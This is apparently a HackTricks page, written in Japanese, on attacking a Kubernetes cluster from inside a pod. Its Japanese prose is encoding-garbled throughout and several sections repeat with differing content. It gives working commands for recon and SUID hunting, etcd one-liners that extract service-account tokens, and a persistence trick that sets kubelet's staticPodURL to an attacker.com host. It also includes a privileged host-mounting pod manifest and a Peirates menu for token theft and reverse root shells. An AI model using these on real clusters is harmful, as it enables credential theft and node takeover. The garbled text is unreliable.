æ”»æ’ƒè€…ã¯ã€ãƒãƒƒãƒ‰å†…ã§å®Ÿè¡Œã•ã‚Œã¦ã„ã‚‹ã‚³ãƒ³ãƒ†ãƒŠã‚„ãƒ—ãƒ­ã‚»ã‚¹ã«é–¢ã™ã‚‹æƒ…å ±ã‚’åé›†ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã‚Œã«ã¯ã€æ¬¡ã®ã‚ˆã†ãªæ‰‹æ³•ãŒã‚ã‚Šã¾ã™ã€‚

### 1.1. ãƒ—ãƒ­ã‚»ã‚¹ãƒªã‚¹ãƒˆã®å–å¾—

æ”»æ’ƒè€…ã¯ã€`ps`ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã—ã¦ãƒãƒƒãƒ‰å†…ã®å®Ÿè¡Œä¸­ã®ãƒ—ãƒ­ã‚»ã‚¹ã®ãƒªã‚¹ãƒˆã‚’å–å¾—ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

```bash
ps aux
```

### 1.2. ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯æ¥ç¶šã®ç¢ºèª

æ”»æ’ƒè€…ã¯ã€`netstat`ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã—ã¦ãƒãƒƒãƒ‰å†…ã®ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯æ¥ç¶šã‚’ç¢ºèªã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

```bash
netstat -tuln
```

### 1.3. ãƒ•ã‚¡ã‚¤ãƒ«ã‚·ã‚¹ãƒ†ãƒ ã®èª¿æŸ»

æ”»æ’ƒè€…ã¯ã€ãƒãƒƒãƒ‰å†…ã®ãƒ•ã‚¡ã‚¤ãƒ«ã‚·ã‚¹ãƒ†ãƒ ã‚’èª¿æŸ»ã™ã‚‹ã“ã¨ã§ã€é‡è¦ãªãƒ•ã‚¡ã‚¤ãƒ«ã‚„æ§‹æˆæƒ…å ±ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

```bash
ls -la /
```

## 2. ãƒãƒƒãƒ‰å†…ã®ç‰¹æ¨©ã®æ˜‡æ ¼

æ”»æ’ƒè€…ã¯ã€ãƒãƒƒãƒ‰å†…ã§ç‰¹æ¨©ã®æ˜‡æ ¼ã‚’è©¦ã¿ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ç‰¹æ¨©ã®æ˜‡æ ¼ã«ã¯ã€æ¬¡ã®ã‚ˆã†ãªæ‰‹æ³•ãŒã‚ã‚Šã¾ã™ã€‚

### 2.1. SUID/SGIDãƒã‚¤ãƒŠãƒªã®æ¤œç´¢

æ”»æ’ƒè€…ã¯ã€SUIDï¼ˆSet User IDï¼‰ã‚„SGIDï¼ˆSet Group IDï¼‰ãƒ“ãƒƒãƒˆãŒè¨­å®šã•ã‚ŒãŸãƒã‚¤ãƒŠãƒªã‚’æ¤œç´¢ã—ã€ç‰¹æ¨©ã®æ˜‡æ ¼ã«åˆ©ç”¨ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

```bash
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null
```

### 2.2. ãƒ—ãƒ­ã‚»ã‚¹ã®ä¹—ã£å–ã‚Š

æ”»æ’ƒè€…ã¯ã€ãƒãƒƒãƒ‰å†…ã®åˆ¥ã®ãƒ—ãƒ­ã‚»ã‚¹ã‚’ä¹—ã£å–ã‚‹ã“ã¨ã§ç‰¹æ¨©ã®æ˜‡æ ¼ã‚’è©¦ã¿ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

```bash
ps aux | grep -v "grep" | grep "root"
```

## 3. ãƒãƒƒãƒ‰å†…ã®ä»–ã®ãƒªã‚½ãƒ¼ã‚¹ã¸ã®æ”»æ’ƒ

æ”»æ’ƒè€…ã¯ã€ãƒãƒƒãƒ‰å†…ã‹ã‚‰ä»–ã®ãƒªã‚½ãƒ¼ã‚¹ã¸ã®æ”»æ’ƒã‚’è©¦ã¿ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã‚Œã«ã¯ã€æ¬¡ã®ã‚ˆã†ãªæ‰‹æ³•ãŒã‚ã‚Šã¾ã™ã€‚

### 3.1. ãƒãƒƒãƒ‰é–“é€šä¿¡ã®å‚å—

æ”»æ’ƒè€…ã¯ã€ãƒãƒƒãƒ‰é–“ã®é€šä¿¡ã‚’å‚å—ã™ã‚‹ã“ã¨ã§ã€æ©Ÿå¯†æƒ…å ±ã‚’å–å¾—ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

```bash
tcpdump -i any -w capture.pcap
```

### 3.2. ã‚¯ãƒ©ã‚¹ã‚¿å†…ã®ä»–ã®ãƒãƒƒãƒ‰ã¸ã®æ”»æ’ƒ

æ”»æ’ƒè€…ã¯ã€ãƒãƒƒãƒ‰å†…ã‹ã‚‰ã‚¯ãƒ©ã‚¹ã‚¿å†…ã®ä»–ã®ãƒãƒƒãƒ‰ã«æ”»æ’ƒã‚’ä»•æ›ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

```bash
curl http://<target-pod-ip>
```

### 3.3. ã‚¯ãƒ©ã‚¹ã‚¿å†…ã®ä»–ã®ãƒªã‚½ãƒ¼ã‚¹ã¸ã®æ”»æ’ƒ

æ”»æ’ƒè€…ã¯ã€ãƒãƒƒãƒ‰å†…ã‹ã‚‰ã‚¯ãƒ©ã‚¹ã‚¿å†…ã®ä»–ã®ãƒªã‚½ãƒ¼ã‚¹ï¼ˆã‚µãƒ¼ãƒ“ã‚¹ã€ãƒ‡ãƒ—ãƒ­ã‚¤ãƒ¡ãƒ³ãƒˆãªã©ï¼‰ã«æ”»æ’ƒã‚’ä»•æ›ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

```bash
kubectl exec -it <target-pod> -- <command>
```

ä»¥ä¸ŠãŒã€ãƒãƒƒãƒ‰å†…ã‹ã‚‰ã®æ”»æ’ƒã«é–¢ã™ã‚‹åŸºæœ¬çš„ãªæƒ…å ±ã§ã™ã€‚æ”»æ’ƒè€…ãŒãƒãƒƒãƒ‰å†…ã«ä¾µå…¥ã—ãŸå ´åˆã€ã‚¯ãƒ©ã‚¹ã‚¿å†…ã®ä»–ã®ãƒªã‚½ãƒ¼ã‚¹ã«å¯¾ã—ã¦æ¨©é™ã‚’æŒã¤å¯èƒ½æ€§ãŒã‚ã‚‹ãŸã‚ã€ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£å¯¾ç­–ãŒé‡è¦ã§ã™ã€‚
```bash
data-dir=/var/lib/etcd
```
**etcdãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã®ãƒ‡ãƒ¼ã‚¿ã‚’è¡¨ç¤ºã™ã‚‹ï¼š**
```bash
strings /var/lib/etcd/member/snap/db | less
```
**ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã‹ã‚‰ãƒˆãƒ¼ã‚¯ãƒ³ã‚’æŠ½å‡ºã—ã€ã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆåã‚’è¡¨ç¤ºã—ã¾ã™**
```bash
db=`strings /var/lib/etcd/member/snap/db`; for x in `echo "$db" | grep eyJhbGciOiJ`; do name=`echo "$db" | grep $x -B40 | grep registry`; echo $name \| $x; echo; done
```
**åŒã˜ã‚³ãƒãƒ³ãƒ‰ã§ã™ãŒã€grepsã‚’ä½¿ç”¨ã—ã¦kube-systemåå‰ç©ºé–“ã§ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆãƒˆãƒ¼ã‚¯ãƒ³ã®ã¿ã‚’è¿”ã™ã‚ˆã†ã«ã—ã¾ã™**
```bash
db=`strings /var/lib/etcd/member/snap/db`; for x in `echo "$db" | grep eyJhbGciOiJ`; do name=`echo "$db" | grep $x -B40 | grep registry`; echo $name \| $x; echo; done | grep kube-system | grep default
```
# Kuberneteså†…ã®ãƒãƒƒãƒ‰ã‹ã‚‰ã®æ”»æ’ƒ

ã“ã®ã‚»ã‚¯ã‚·ãƒ§ãƒ³ã§ã¯ã€Kubernetesã‚¯ãƒ©ã‚¹ã‚¿å†…ã®ãƒãƒƒãƒ‰ã‹ã‚‰ã®æ”»æ’ƒã«ã¤ã„ã¦èª¬æ˜ã—ã¾ã™ã€‚ãƒãƒƒãƒ‰å†…ã‹ã‚‰ã®æ”»æ’ƒã¯ã€ã‚¯ãƒ©ã‚¹ã‚¿å†…ã®ä»–ã®ãƒªã‚½ãƒ¼ã‚¹ã«å¯¾ã—ã¦æ¨©é™ã‚’æŒã¤æ”»æ’ƒè€…ã«ã‚ˆã£ã¦è¡Œã‚ã‚Œã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

## 1. ãƒãƒƒãƒ‰å†…ã®æƒ…å ±åé›†

æ”»æ’ƒè€…ã¯ã€ãƒãƒƒãƒ‰å†…ã§å®Ÿè¡Œã•ã‚Œã¦ã„ã‚‹ã‚³ãƒ³ãƒ†ãƒŠã‚„ãƒ—ãƒ­ã‚»ã‚¹ã«é–¢ã™ã‚‹æƒ…å ±ã‚’åé›†ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã‚Œã«ã¯ã€æ¬¡ã®ã‚ˆã†ãªæ‰‹æ³•ãŒã‚ã‚Šã¾ã™ã€‚

### 1.1. ãƒ—ãƒ­ã‚»ã‚¹ãƒªã‚¹ãƒˆã®å–å¾—

æ”»æ’ƒè€…ã¯ã€`ps`ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã—ã¦ãƒãƒƒãƒ‰å†…ã®å®Ÿè¡Œä¸­ã®ãƒ—ãƒ­ã‚»ã‚¹ã®ãƒªã‚¹ãƒˆã‚’å–å¾—ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

```bash
$ ps aux
```

### 1.2. ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯æ¥ç¶šã®ç¢ºèª

æ”»æ’ƒè€…ã¯ã€`netstat`ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã—ã¦ãƒãƒƒãƒ‰å†…ã®ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯æ¥ç¶šã‚’ç¢ºèªã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

```bash
$ netstat -tuln
```

### 1.3. ãƒ•ã‚¡ã‚¤ãƒ«ã‚·ã‚¹ãƒ†ãƒ ã®èª¿æŸ»

æ”»æ’ƒè€…ã¯ã€ãƒãƒƒãƒ‰å†…ã®ãƒ•ã‚¡ã‚¤ãƒ«ã‚·ã‚¹ãƒ†ãƒ ã‚’èª¿æŸ»ã™ã‚‹ã“ã¨ã§ã€é‡è¦ãªãƒ•ã‚¡ã‚¤ãƒ«ã‚„æ§‹æˆæƒ…å ±ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

```bash
$ ls -la /
```

## 2. ãƒãƒƒãƒ‰å†…ã®ç‰¹æ¨©ã®æ˜‡æ ¼

æ”»æ’ƒè€…ã¯ã€ãƒãƒƒãƒ‰å†…ã§ç‰¹æ¨©ã®æ˜‡æ ¼ã‚’è©¦ã¿ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ç‰¹æ¨©ã®æ˜‡æ ¼ã«ã¯ã€æ¬¡ã®ã‚ˆã†ãªæ‰‹æ³•ãŒã‚ã‚Šã¾ã™ã€‚

### 2.1. SUID/SGIDãƒã‚¤ãƒŠãƒªã®æ¤œç´¢

æ”»æ’ƒè€…ã¯ã€SUIDï¼ˆSet User IDï¼‰ã‚„SGIDï¼ˆSet Group IDï¼‰ãƒ“ãƒƒãƒˆãŒè¨­å®šã•ã‚ŒãŸãƒã‚¤ãƒŠãƒªã‚’æ¤œç´¢ã—ã€ç‰¹æ¨©ã®æ˜‡æ ¼ã«åˆ©ç”¨ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

```bash
$ find / -perm -4000 -type f 2>/dev/null
$ find / -perm -2000 -type f 2>/dev/null
```

### 2.2. ã‚«ãƒ¼ãƒãƒ«ã®è„†å¼±æ€§ã®åˆ©ç”¨

æ”»æ’ƒè€…ã¯ã€ãƒãƒƒãƒ‰å†…ã®ã‚«ãƒ¼ãƒãƒ«ã«å­˜åœ¨ã™ã‚‹è„†å¼±æ€§ã‚’åˆ©ç”¨ã—ã¦ç‰¹æ¨©ã®æ˜‡æ ¼ã‚’è©¦ã¿ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

## 3. ãƒãƒƒãƒ‰å†…ã®ä»–ã®ãƒªã‚½ãƒ¼ã‚¹ã¸ã®æ”»æ’ƒ

æ”»æ’ƒè€…ã¯ã€ãƒãƒƒãƒ‰å†…ã‹ã‚‰ä»–ã®ãƒªã‚½ãƒ¼ã‚¹ã¸ã®æ”»æ’ƒã‚’è©¦ã¿ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã‚Œã«ã¯ã€æ¬¡ã®ã‚ˆã†ãªæ‰‹æ³•ãŒã‚ã‚Šã¾ã™ã€‚

### 3.1. ãƒãƒƒãƒ‰é–“é€šä¿¡ã®å‚å—

æ”»æ’ƒè€…ã¯ã€ãƒãƒƒãƒ‰é–“ã®é€šä¿¡ã‚’å‚å—ã™ã‚‹ã“ã¨ã§ã€æ©Ÿå¯†æƒ…å ±ã‚’ç›—ã‚€ã“ã¨ãŒã§ãã¾ã™ã€‚

### 3.2. ã‚¯ãƒ©ã‚¹ã‚¿å†…ã®ä»–ã®ãƒãƒƒãƒ‰ã¸ã®æ”»æ’ƒ

æ”»æ’ƒè€…ã¯ã€ãƒãƒƒãƒ‰å†…ã‹ã‚‰ã‚¯ãƒ©ã‚¹ã‚¿å†…ã®ä»–ã®ãƒãƒƒãƒ‰ã«å¯¾ã—ã¦æ”»æ’ƒã‚’è¡Œã†ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã‚Œã«ã¯ã€ãƒãƒƒãƒ‰é–“é€šä¿¡ã®å‚å—ã€ãƒãƒƒãƒ‰ã¸ã®æ”»æ’ƒã€ãŠã‚ˆã³ãƒãƒƒãƒ‰ã®æƒ…å ±æ¼æ´©ãªã©ã®æ‰‹æ³•ãŒå«ã¾ã‚Œã¾ã™ã€‚

## 4. å¯¾ç­–

ãƒãƒƒãƒ‰å†…ã‹ã‚‰ã®æ”»æ’ƒã‚’é˜²ããŸã‚ã«ã¯ã€æ¬¡ã®å¯¾ç­–ã‚’å®Ÿæ–½ã™ã‚‹ã“ã¨ãŒé‡è¦ã§ã™ã€‚

- ãƒãƒƒãƒ‰å†…ã®ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã‚’å¼·åŒ–ã™ã‚‹
- ãƒãƒƒãƒ‰é–“é€šä¿¡ã®æš—å·åŒ–ã‚’å®Ÿæ–½ã™ã‚‹
- ãƒãƒƒãƒ‰å†…ã®ç‰¹æ¨©ã®æ˜‡æ ¼ã‚’é˜²ã
- ãƒãƒƒãƒ‰ã®ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆã‚’é©åˆ‡ã«è¨­å®šã™ã‚‹

ä»¥ä¸ŠãŒã€Kuberneteså†…ã®ãƒãƒƒãƒ‰ã‹ã‚‰ã®æ”»æ’ƒã«é–¢ã™ã‚‹æƒ…å ±ã§ã™ã€‚æ”»æ’ƒè€…ãŒãƒãƒƒãƒ‰å†…ã‹ã‚‰ä»–ã®ãƒªã‚½ãƒ¼ã‚¹ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã“ã¨ã‚’é˜²ããŸã‚ã«ã€é©åˆ‡ãªå¯¾ç­–ã‚’å®Ÿæ–½ã™ã‚‹ã“ã¨ãŒé‡è¦ã§ã™ã€‚
```
1/registry/secrets/kube-system/default-token-d82kb | eyJhbGciOiJSUzI1NiIsImtpZCI6IkplRTc0X2ZP[REDACTED]
```
### é™çš„/ãƒŸãƒ©ãƒ¼ãƒãƒƒãƒ‰ã®æ°¸ç¶šæ€§

_é™çš„ãƒãƒƒãƒ‰_ã¯ã€APIã‚µãƒ¼ãƒãƒ¼ãŒç›£è¦–ã›ãšã«ã€ç‰¹å®šã®ãƒãƒ¼ãƒ‰ä¸Šã®kubeletãƒ‡ãƒ¼ãƒ¢ãƒ³ã«ã‚ˆã£ã¦ç›´æ¥ç®¡ç†ã•ã‚Œã¾ã™ã€‚ãƒ‡ãƒ—ãƒ­ã‚¤ãƒ¡ãƒ³ãƒˆãªã©ã®ã‚³ãƒ³ãƒˆãƒ­ãƒ¼ãƒ«ãƒ—ãƒ¬ãƒ¼ãƒ³ã«ã‚ˆã£ã¦ç®¡ç†ã•ã‚Œã‚‹ãƒãƒƒãƒ‰ã¨ã¯ç•°ãªã‚Šã€**kubeletã¯å„é™çš„ãƒãƒƒãƒ‰ã‚’ç›£è¦–ã—ã€å¤±æ•—ã—ãŸå ´åˆã«å†èµ·å‹•ã—ã¾ã™**ã€‚

ã—ãŸãŒã£ã¦ã€é™çš„ãƒãƒƒãƒ‰ã¯å¸¸ã«ç‰¹å®šã®ãƒãƒ¼ãƒ‰ä¸Šã®**1ã¤ã®Kubeletã«ãƒã‚¤ãƒ³ãƒ‰ã•ã‚Œã¾ã™**ã€‚

**kubeletã¯è‡ªå‹•çš„ã«Kubernetes APIã‚µãƒ¼ãƒãƒ¼ä¸Šã«ãƒŸãƒ©ãƒ¼ãƒãƒƒãƒ‰ã‚’ä½œæˆ**ã—ã‚ˆã†ã¨ã—ã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€ãƒãƒ¼ãƒ‰ä¸Šã§å®Ÿè¡Œã•ã‚Œã¦ã„ã‚‹ãƒãƒƒãƒ‰ã¯APIã‚µãƒ¼ãƒãƒ¼ä¸Šã§è¡¨ç¤ºã•ã‚Œã¾ã™ãŒã€ãã“ã‹ã‚‰åˆ¶å¾¡ã™ã‚‹ã“ã¨ã¯ã§ãã¾ã›ã‚“ã€‚ãƒãƒƒãƒ‰åã¯ã€ãƒãƒ¼ãƒ‰ã®ãƒ›ã‚¹ãƒˆåã«å…ˆè¡Œã™ã‚‹ãƒã‚¤ãƒ•ãƒ³ã§æ¥å°¾è¾ãŒä»˜ãã¾ã™ã€‚

{% hint style="danger" %}
é™çš„ãƒãƒƒãƒ‰ã®**`spec`ã¯ä»–ã®APIã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚’å‚ç…§ã™ã‚‹ã“ã¨ã¯ã§ãã¾ã›ã‚“**ï¼ˆãŸã¨ãˆã°ã€ServiceAccountã€ConfigMapã€Secretãªã©ï¼‰ã€‚ã—ãŸãŒã£ã¦ã€ç¾åœ¨ã®ãƒãƒ¼ãƒ‰ã§ä»»æ„ã®serviceAccountã‚’ä½¿ç”¨ã—ã¦ãƒãƒƒãƒ‰ã‚’èµ·å‹•ã—ã¦ã‚¯ãƒ©ã‚¹ã‚¿ã‚’å±é™ºã«ã•ã‚‰ã™ã“ã¨ã¯ã§ãã¾ã›ã‚“ã€‚ãŸã ã—ã€ã“ã‚Œã‚’ä½¿ç”¨ã—ã¦ç•°ãªã‚‹åå‰ç©ºé–“ã§ãƒãƒƒãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ã¯ã§ãã¾ã™ï¼ˆä½•ã‚‰ã‹ã®ç†ç”±ã§ä¾¿åˆ©ãªå ´åˆï¼‰ã€‚
{% endhint %}

ãƒãƒ¼ãƒ‰ãƒ›ã‚¹ãƒˆå†…ã«ã„ã‚‹å ´åˆã€**è‡ªèº«ã®å†…éƒ¨ã«é™çš„ãƒãƒƒãƒ‰ã‚’ä½œæˆ**ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã‚Œã¯éå¸¸ã«ä¾¿åˆ©ã§ã™ã€ãªãœãªã‚‰ã“ã‚Œã«ã‚ˆã‚Š**kube-system**ã®ã‚ˆã†ãª**ç•°ãªã‚‹åå‰ç©ºé–“ã«ãƒãƒƒãƒ‰ã‚’ä½œæˆ**ã™ã‚‹ã“ã¨ãŒã§ãã‚‹ã‹ã‚‰ã§ã™ã€‚

é™çš„ãƒãƒƒãƒ‰ã‚’ä½œæˆã™ã‚‹ã«ã¯ã€[**ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆãŒå¤§ã„ã«å½¹ç«‹ã¡ã¾ã™**](https://kubernetes.io/docs/tasks/configure-pod-container/static-pod/)ã€‚åŸºæœ¬çš„ã«ã¯2ã¤ã®ã“ã¨ãŒå¿…è¦ã§ã™ï¼š

* **kubeletã‚µãƒ¼ãƒ“ã‚¹**ã¾ãŸã¯**kubeletæ§‹æˆ**ï¼ˆ[**staticPodPath**](https://kubernetes.io/docs/reference/config-api/kubelet-config.v1beta1/#kubelet-config-k8s-io-v1beta1-KubeletConfiguration)ï¼‰ã§ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿**`--pod-manifest-path=/etc/kubernetes/manifests`**ã‚’è¨­å®šã—ã€ã‚µãƒ¼ãƒ“ã‚¹ã‚’å†èµ·å‹•ã—ã¾ã™ã€‚
* **`/etc/kubernetes/manifests`**ã®**ãƒãƒƒãƒ‰å®šç¾©**ã«å®šç¾©ã‚’ä½œæˆã—ã¾ã™ã€‚

**ã‚‚ã†1ã¤ã®ã‚ˆã‚Šã‚¹ãƒ†ãƒ«ã‚¹ãªæ–¹æ³•ã¯æ¬¡ã®ã¨ãŠã‚Šã§ã™ï¼š**

* **kubelet**æ§‹æˆãƒ•ã‚¡ã‚¤ãƒ«ã®ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿**`staticPodURL`**ã‚’å¤‰æ›´ã—ã€`staticPodURL: http://attacker.com:8765/pod.yaml`ã®ã‚ˆã†ã«è¨­å®šã—ã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€kubeletãƒ—ãƒ­ã‚»ã‚¹ãŒæŒ‡å®šã•ã‚ŒãŸURLã‹ã‚‰**æ§‹æˆã‚’å–å¾—ã—ã¦é™çš„ãƒãƒƒãƒ‰ã‚’ä½œæˆ**ã—ã¾ã™ã€‚

[**ã“ã“**](https://research.nccgroup.com/2020/02/12/command-and-kubectl-talk-follow-up/)ã‹ã‚‰å–å¾—ã—ãŸã€**kube-system**ã«ç‰¹æ¨©ãƒãƒƒãƒ‰ã‚’ä½œæˆã™ã‚‹ãŸã‚ã®**ãƒãƒƒãƒ‰**ã®è¨­å®šã®**ä¾‹**ï¼š
```yaml
apiVersion: v1
kind: Pod
metadata:
name: bad-priv2
namespace: kube-system
spec:
containers:
- name: bad
hostPID: true
image: gcr.io/shmoocon-talk-hacking/brick
stdin: true
tty: true
imagePullPolicy: IfNotPresent
volumeMounts:
- mountPath: /chroot
name: host
securityContext:
privileged: true
volumes:
- name: host
hostPath:
path: /
type: Directory
```
### ãƒãƒƒãƒ‰ã®å‰Šé™¤ + ã‚¹ã‚±ã‚¸ãƒ¥ãƒ¼ãƒ«ä¸å¯ãƒãƒ¼ãƒ‰

æ”»æ’ƒè€…ãŒ**ãƒãƒ¼ãƒ‰ã‚’ä¾µå®³**ã—ã€ä»–ã®ãƒãƒ¼ãƒ‰ã‹ã‚‰**ãƒãƒƒãƒ‰ã‚’å‰Šé™¤**ã—ã€ä»–ã®ãƒãƒ¼ãƒ‰ã§**ãƒãƒƒãƒ‰ã‚’å®Ÿè¡Œã§ããªãã™ã‚‹**ã“ã¨ãŒã§ãã‚‹å ´åˆã€ãƒãƒƒãƒ‰ã¯ä¾µå®³ã•ã‚ŒãŸãƒãƒ¼ãƒ‰ã§å†å®Ÿè¡Œã•ã‚Œã€å½¼ã¯ãã‚Œã‚‰ã§å®Ÿè¡Œã•ã‚Œã‚‹ãƒˆãƒ¼ã‚¯ãƒ³ã‚’**ç›—ã‚€ã“ã¨ãŒã§ãã¾ã™**ã€‚\
[**è©³ç´°ã«ã¤ã„ã¦ã¯ã€ã“ã®ãƒªãƒ³ã‚¯ã‚’å‚ç…§ã—ã¦ãã ã•ã„**](abusing-roles-clusterroles-in-kubernetes/#delete-pods-+-unschedulable-nodes)ã€‚

## è‡ªå‹•ãƒ„ãƒ¼ãƒ«

* [**https://github.com/inguardians/peirates**](https://github.com/inguardians/peirates)
```
Peirates v1.1.8-beta by InGuardians
https://www.inguardians.com/peirates
----------------------------------------------------------------
[+] Service Account Loaded: Pod ns::dashboard-56755cd6c9-n8zt9
[+] Certificate Authority Certificate: true
[+] Kubernetes API Server: https://10.116.0.1:443
[+] Current hostname/pod name: dashboard-56755cd6c9-n8zt9
[+] Current namespace: prd
----------------------------------------------------------------
Namespaces, Service Accounts and Roles |
---------------------------------------+
[1] List, maintain, or switch service account contexts [sa-menu]  (try: listsa *, switchsa)
[2] List and/or change namespaces [ns-menu] (try: listns, switchns)
[3] Get list of pods in current namespace [list-pods]
[4] Get complete info on all pods (json) [dump-pod-info]
[5] Check all pods for volume mounts [find-volume-mounts]
[6] Enter AWS IAM credentials manually [enter-aws-credentials]
[7] Attempt to Assume a Different AWS Role [aws-assume-role]
[8] Deactivate assumed AWS role [aws-empty-assumed-role]
[9] Switch authentication contexts: certificate-based authentication (kubelet, kubeproxy, manually-entered) [cert-menu]
-------------------------+
Steal Service Accounts   |
-------------------------+
[10] List secrets in this namespace from API server [list-secrets]
[11] Get a service account token from a secret [secret-to-sa]
[12] Request IAM credentials from AWS Metadata API [get-aws-token] *
[13] Request IAM credentials from GCP Metadata API [get-gcp-token] *
[14] Request kube-env from GCP Metadata API [attack-kube-env-gcp]
[15] Pull Kubernetes service account tokens from kops' GCS bucket (Google Cloudonly) [attack-kops-gcs-1]  *
[16] Pull Kubernetes service account tokens from kops' S3 bucket (AWS only) [attack-kops-aws-1]
--------------------------------+
Interrogate/Abuse Cloud API's   |
--------------------------------+
[17] List AWS S3 Buckets accessible (Make sure to get credentials via get-aws-token or enter manually) [aws-s3-ls]
[18] List contents of an AWS S3 Bucket (Make sure to get credentials via get-aws-token or enter manually) [aws-s3-ls-objects]
-----------+
Compromise |
-----------+
[20] Gain a reverse rootshell on a node by launching a hostPath-mounting pod [attack-pod-hostpath-mount]
[21] Run command in one or all pods in this namespace via the API Server [exec-via-api]
[22] Run a token-dumping command in all pods via Kubelets (authorization permitting) [exec-via-kubelet]
-------------+
Node Attacks |
-------------+
[30] Steal secrets from the node filesystem [nodefs-steal-secrets]
-----------------+
Off-Menu         +
-----------------+
[90] Run a kubectl command using the current authorization context [kubectl [arguments]]
[] Run a kubectl command using EVERY authorization context until one works [kubectl-try-all [arguments]]
[91] Make an HTTP request (GET or POST) to a user-specified URL [curl]
[92] Deactivate "auth can-i" checking before attempting actions [set-auth-can-i]
[93] Run a simple all-ports TCP port scan against an IP address [tcpscan]
[94] Enumerate services via DNS [enumerate-dns] *
[]  Run a shell command [shell <command and arguments>]

[exit] Exit Peirates
```
<details>

<summary><strong>ãƒãƒƒã‚¯ãƒˆãƒªãƒƒã‚¯ã‚’ã‚µãƒãƒ¼ãƒˆã—ã¦ç‰¹å…¸ã‚’å¾—ã‚‹ï¼</strong></summary>

* **HackTricksã§ä¼šç¤¾ã‚’å®£ä¼ã—ãŸã„**å ´åˆã‚„ã€**æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã®PEASSã«ã‚¢ã‚¯ã‚»ã‚¹ã—ãŸã„**å ´åˆã¯ã€[**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**å…¬å¼PEASSï¼†HackTricksã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’è¦‹ã¤ã‘ã¦ã€ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’ç™ºè¦‹ã—ã¾ã—ã‚‡ã†
* **ğŸ’¬ [Discordã‚°ãƒ«ãƒ¼ãƒ—](https://discord.gg/hRep4RUj7f)**ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter**ã§ç§ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ãŸã‚ã«ã€PRã‚’** [**HackTricks**](https://github.com/carlospolop/hacktricks) **ãŠã‚ˆã³** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>
